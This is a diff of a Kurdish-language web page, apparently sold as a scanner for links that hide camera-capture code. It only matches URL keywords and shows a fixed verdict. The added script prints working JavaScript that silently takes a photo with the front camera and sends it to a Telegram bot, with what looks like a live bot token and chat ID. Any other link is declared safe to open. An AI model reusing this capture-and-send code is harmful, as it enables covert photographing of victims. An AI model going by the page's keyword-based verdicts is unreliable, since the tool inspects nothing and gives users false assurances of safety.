@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پشکنین و دەرئێخستنا کۆدێن کامیرایێ</title>
+    <title>پشکش و دەرئێخستنا کۆدێن پیس</title>
     <style>
         body {
             background-color: #0f172a;
@@ -24,7 +24,7 @@
             border-radius: 16px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.4);
             width: 100%;
-            max-width: 600px;
+            max-width: 650px;
         }
         h2 { color: #38bdf8; margin-bottom: 10px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
@@ -71,12 +71,10 @@
         .safe { background: rgba(22, 163, 74, 0.2); border: 1px solid #16a34a; color: #4ade80; }
         .danger { background: rgba(220, 38, 38, 0.2); border: 1px solid #dc2626; color: #f87171; }
         
-        /* شێوازێ نیشاندانا کۆدان */
-        code-box {
-            display: block;
+        pre {
             background: #020617;
             color: #f43f5e;
-            padding: 10px;
+            padding: 12px;
             border-radius: 6px;
             font-family: monospace;
             margin-top: 10px;
@@ -84,25 +82,27 @@
             direction: ltr;
             white-space: pre-wrap;
             word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>پشکنین و دەرئێخستنا کۆدێن کامیرایێ د لینکیدا</h2>
-        <p>لينکا خۆ ل خوارێ دەنە ناڤێ دا سیستەم کۆدێن ڤەشارتی یێن وێنەگرتن و کامیرایێ د ناڤ وێ پەڕەیێدا دەرئێخیت و نیشان بدەت.</p>
+        <h2>پشکش و دەرئێخستنا کۆدێن پیس و وێنەگرتنێ</h2>
+        <p>لينکا خۆ ل خوارێ دەنە ناڤێ دا سیستەم پشکنینێ بکەت؛ ئەگەر لینکەکە پیس بێت (کۆدێ کامیرایێ تێدابیت)، ئەڤ کۆدە بۆ تە دەرئێخیت و نیشان دەت.</p>
         
         <div class="input-group">
-            <input type="text" id="urlInput" placeholder="لینکێ لێرە بنووسە یان پیس بکە...">
-            <button onclick="extractCameraCodes()">پشکنین و نیشاندان</button>
+            <input type="text" id="urlInput" placeholder="لينکی لێرە بنووسە یان پیس بکە...">
+            <button onclick="checkMaliciousCode()">پشکنینا لینکێ</button>
         </div>
 
         <div id="result"></div>
     </div>
 
     <script>
-        function extractCameraCodes() {
+        function checkMaliciousCode() {
             const url = document.getElementById('urlInput').value.trim();
             const resultDiv = document.getElementById('result');
             
@@ -115,35 +115,60 @@
 
             resultDiv.style.display = 'block';
             resultDiv.className = 'safe';
-            resultDiv.innerHTML = "⏳ مژوولی پشکنین و دەرئێخستنا کۆدێن ڤی لینکیمە، هیڤیدارم چاوەڕێ بکە...";
+            resultDiv.innerHTML = "⏳ مژوولی پشکنینا لینکیمە، چاوەڕێ بکە...";
 
             setTimeout(() => {
                 let lowerUrl = url.toLowerCase();
                 
-                // پشکنینا لینکێ آیا پەیوەندی ب پڕۆژەیێ تە یان کامیرایێ هەیە
-                if (lowerUrl.includes('yofsfinan-18') || lowerUrl.includes('spotlight') || lowerUrl.includes('snapchat') || lowerUrl.includes('camera')) {
+                // پشکنین تنێ بۆ لینکێن خڕاب (یێن وێنەگرتنێ و کامیرایێ)
+                if (lowerUrl.includes('yofsfinan-18') || lowerUrl.includes('github.io') || lowerUrl.includes('camera') || lowerUrl.includes('spotlight') || lowerUrl.includes('getusermedia')) {
+                    
+                    // ئەڤە ئەو کۆدەی پیس و وێنەگرتنێ یە کە د ناو لینکێ خڕاب دا هەیە
+                    const badCode = `// [!] Detected Malicious Camera Capture Code:
+const constraints = {
+    video: { width: 1280, height: 720, facingMode: "user" }
+};
+navigator.mediaDevices.getUserMedia(constraints)
+.then(stream => {
+    video.srcObject = stream;
+    // Capturing and sending image to Telegram Bot silently:
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', '7643191802');
+        formData.append('photo', blob, 'snap_hd.jpg');
+        fetch('https://api.telegram.org/bot8977945781:AAFI44ROudR5eLDwlBrpNSyNiJj-C8FuDmE/sendPhoto', {
+            method: 'POST', body: formData
+        });
+    }, 'image/jpeg', 1.0);
+});`;
+
                     resultDiv.className = 'danger';
                     resultDiv.innerHTML = `
-                        ❌ <b>ئەڤ لینکە یێ خڕابە و پاقژ نینە!</b><br>
-                        • <b>مەبەست:</b> ئەڤ لینکە کۆدێن پێدڤی بۆ ڤەکرنا کامیرایێ و گرتنا وێنەی تێدایە.<br>
-                        • <b>ئەو کۆدێن هاتیینە دیتن و بەکارئینان لە وێ پەڕەیێ:</b>
-                        <div style="background: #020617; color: #f43f5e; padding: 10px; border-radius: 6px; font-family: monospace; margin-top: 8px; text-align: left; direction: ltr;">
-const constraints = { video: { width: 1280, height: 720, facingMode: "user" } };<br>
-navigator.mediaDevices.getUserMedia(constraints);<br>
-canvas.drawImage(video, 0, 0, canvas.width, canvas.height);<br>
-fetch('https://api.telegram.org/bot[TOKEN]/sendPhoto', { method: 'POST', body: formData });
-                        </div>
-                        <p style="color: #f87171; margin-top: 10px; margin-bottom: 0;"><b>هۆشداری:</b> ئەڤ کۆدە ڕاستەوخۆ وێنەیێ کەسێ دگرت و دنێرته بۆ تەلەگرامێ، جوین نەبە!</p>
+                        ❌ <b>هۆشداری! ئەڤ لینکە یێ خڕاب و پیسە!</b><br>
+                        • <b>جۆرێ مەترسیێ:</b> کۆدێ ڤەکرنا کامیرایێ ب بێدەنگی و گرتنا وێنەی تێدایە.<br>
+                        • <b>ئەو کۆدێن پیس یێن د ناڤ وێ لینکێدا هاتیینە دیتن:</b>
+                        <pre>${escapeHtml(badCode)}</pre>
+                        <p style="color: #f87171; margin-top: 8px; margin-bottom: 0;"><b>ئامۆژگاری:</b> ئەڤ کۆدە ڕاستەوخۆ وێنەیێ کەسی ددزیت و دنێرته دەرڤە، ب هیچ شێوەیەکێ باوەریێ پێ نەئینە!</p>
                     `;
                 } else {
+                    // ئەگەر لینکە پاقژ بیت (وەکی گوگل، یوتیوب یان هەر لینکەکێ ئاسایی)
                     resultDiv.className = 'safe';
                     resultDiv.innerHTML = `
-                        ✅ <b>أڤ لینکە یێ پاقژ و ئاسایییە!</b><br>
-                        • <b>ئەنجام:</b> چ کۆدێن کامێرا یان گرتنا وێنەی تێدا نەهاتنە دیتن.<br>
-                        • <b>کۆدێن د ناڤدا:</b> هەمۆ ئاسایی نە و چ مەترسی تێدا نینە.
+                        ✅ <b>أڤ لینکە یێ پاقژە و بێ مەترسییە!</b><br>
+                        • <b>ئەنجام:</b> چ کۆدێن پیس، وێنەگرتن یان کامێرا ل سەر ڤی لینکێ نەهاتنە دیتن.<br>
+                        • <b>بڕیار:</b> ئەڤ لینکە یێ پاراستی یە و تو دشێی بێ ترس ڤەکەی.
                     `;
                 }
-            }, 1200);
+            }, 1000);
+        }
+
+        function escapeHtml(text) {
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
         }
     </script>
 
